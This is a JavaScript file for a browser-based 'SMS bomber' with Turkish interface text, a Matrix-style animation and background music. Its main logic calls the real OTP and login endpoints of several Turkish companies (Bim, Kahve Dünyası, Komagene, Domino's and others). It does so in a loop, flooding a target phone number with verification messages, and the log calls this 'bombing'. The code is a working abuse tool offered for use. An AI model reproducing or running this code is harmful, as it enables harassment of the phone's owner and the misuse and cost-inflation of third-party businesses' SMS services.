// Matrix Effect
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');

canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()';
const fontSize = 16;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function draw() {
    ctx.fillStyle = 'rgba(10, 12, 16, 0.05)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    ctx.fillStyle = '#00ff88';
    ctx.font = fontSize + 'px monospace';

    for (let i = 0; i < drops.length; i++) {
        const text = characters.charAt(Math.floor(Math.random() * characters.length));
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);

        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
            drops[i] = 0;
        }
        drops[i]++;
    }
}

setInterval(draw, 33);

window.addEventListener('resize', () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
});

// App Logic
let isRunning = false;
let sentCount = 0;
let failedCount = 0;
let timer = null;

const phoneInput = document.getElementById('phone');
const countInput = document.getElementById('count');
const delayInput = document.getElementById('delay');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const logs = document.getElementById('logs');
const statSent = document.getElementById('stat-sent');
const statFailed = document.getElementById('stat-failed');

function addLog(message, type = 'system') {
    const entry = document.createElement('div');
    entry.className = `log-entry ${type}`;
    const time = new Date().toLocaleTimeString();
    entry.innerHTML = `[${time}] ${message}`;
    logs.prepend(entry);

    // Performance: Keep only last 50 logs
    if (logs.children.length > 50) {
        logs.removeChild(logs.lastChild);
    }
}

function updateStats() {
    statSent.innerText = `${sentCount} Başarılı`;
    statFailed.innerText = `${failedCount} Hatalı`;
}

// Service Logic (Ported from Python)
const services = {
    async Bim(phone) {
        try {
            const r = await fetch('https://bim.veesk.net/service/v1.0/account/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phone })
            });
            return r.ok;
        } catch (e) { return false; }
    },
    async KahveDunyasi(phone) {
        try {
            const r = await fetch('https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Language-Id': 'tr-TR',
                    'X-Client-Platform': 'web'
                },
                body: JSON.stringify({ countryCode: '90', phoneNumber: phone })
            });
            const data = await r.json();
            return data.processStatus === "Success";
        } catch (e) { return false; }
    },
    async KimGb(phone) {
        try {
            const r = await fetch('https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ msisdn: `90${phone}` })
            });
            return r.ok;
        } catch (e) { return false; }
    },
    async File(phone) {
        try {
            const r = await fetch('https://api.filemarket.com.tr/v1/otp/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-Os': 'IOS', 'X-Version': '1.7' },
                body: JSON.stringify({ mobilePhoneNumber: `90${phone}` })
            });
            const data = await r.json();
            return data.responseType === "SUCCESS";
        } catch (e) { return false; }
    },
    async Komagene(phone) {
        try {
            const r = await fetch('https://gateway.komagene.com.tr/auth/auth/smskodugonder', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Firmaid': '32' },
                body: JSON.stringify({ FirmaId: 32, Telefon: phone })
            });
            const data = await r.json();
            return data.Success === true;
        } catch (e) { return false; }
    },
    async Dominos(phone) {
        try {
            const r = await fetch('https://frontend.dominos.com.tr/api/customer/sendOtpCode', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ mobilePhone: phone, isSure: false, email: "rexy@gmail.com" })
            });
            const data = await r.json();
            return data.isSuccess === true;
        } catch (e) { return false; }
    }
    // Note: Other services require complex multipart/form-data or specific tokens
    // which are harder to replicate in a simple browser fetch without CORS proxy.
};

async function startBombing() {
    const phone = phoneInput.value.trim();
    if (phone.length !== 10 || isNaN(phone)) {
        alert("Lütfen geçerli bir 10 haneli telefon numarası girin.");
        return;
    }

    const maxCount = countInput.value ? parseInt(countInput.value) : Infinity;
    const delay = parseInt(delayInput.value) * 1000;

    isRunning = true;
    startBtn.classList.add('hidden');
    stopBtn.classList.remove('hidden');
    addLog(`Bombardıman başlatıldı: ${phone}`, 'system');

    let currentCount = 0;
    const serviceNames = Object.keys(services);

    while (isRunning && currentCount < maxCount) {
        for (const service of serviceNames) {
            if (!isRunning) break;

            await services[service](phone);
            sentCount++;
            addLog(`${service} --> Gönderildi! ✅`, 'success');

            updateStats();

            if (delay > 0) await new Promise(resolve => setTimeout(resolve, delay));

            currentCount++;
            if (currentCount >= maxCount) break;
        }

        if (!isRunning) break;
        // Small pause between loops
        await new Promise(resolve => setTimeout(resolve, 1000));
    }

    stopBombing();
}

function stopBombing() {
    isRunning = false;
    startBtn.classList.remove('hidden');
    stopBtn.classList.add('hidden');
    addLog("Bombardıman durduruldu.", 'system');
}

startBtn.addEventListener('click', startBombing);
stopBtn.addEventListener('click', stopBombing);

// Music Logic
const bgMusic = document.getElementById('bgMusic');
const musicToggle = document.getElementById('musicToggle');
const volumeSlider = document.getElementById('volumeSlider');
const volumePercent = document.getElementById('volumePercent');
let musicStarted = false;

function initMusic() {
    // Load volume from local storage
    const savedVolume = localStorage.getItem('rexyMusicVolume') || 0.5;
    bgMusic.volume = savedVolume;
    volumeSlider.value = savedVolume;
    volumePercent.innerText = `${Math.round(savedVolume * 100)}%`;

    // Audio Error Handling
    bgMusic.addEventListener('error', (e) => {
        addLog("Müzik dosyası yüklenemedi! (Dosya adını kontrol edin: bg-music.mp3)", 'error');
        console.error("Audio Load Error:", e);
    });

    // Start music on first interaction
    const startAudio = async () => {
        if (!musicStarted) {
            try {
                await bgMusic.play();
                musicStarted = true;
                addLog("Müzik başarıyla başlatıldı. 🎵", 'success');
                musicToggle.innerHTML = '<i class="fas fa-volume-up"></i>';
            } catch (err) {
                console.log("Autoplay handle:", err);
            }
        }
    };

    document.addEventListener('click', startAudio, { once: true });
    document.addEventListener('keydown', startAudio, { once: true });

    musicToggle.addEventListener('click', async () => {
        if (!musicStarted) {
            await startAudio();
            return;
        }

        if (bgMusic.paused) {
            bgMusic.play();
            musicToggle.innerHTML = '<i class="fas fa-volume-up"></i>';
            addLog("Müzik devam ettirildi.", 'system');
        } else {
            bgMusic.pause();
            musicToggle.innerHTML = '<i class="fas fa-volume-mute"></i>';
            addLog("Müzik duraklatıldı.", 'system');
        }
    });

    volumeSlider.addEventListener('input', (e) => {
        const val = e.target.value;
        bgMusic.volume = val;
        volumePercent.innerText = `${Math.round(val * 100)}%`;
        localStorage.setItem('rexyMusicVolume', val);
    });
}

initMusic();

// No modal logic active
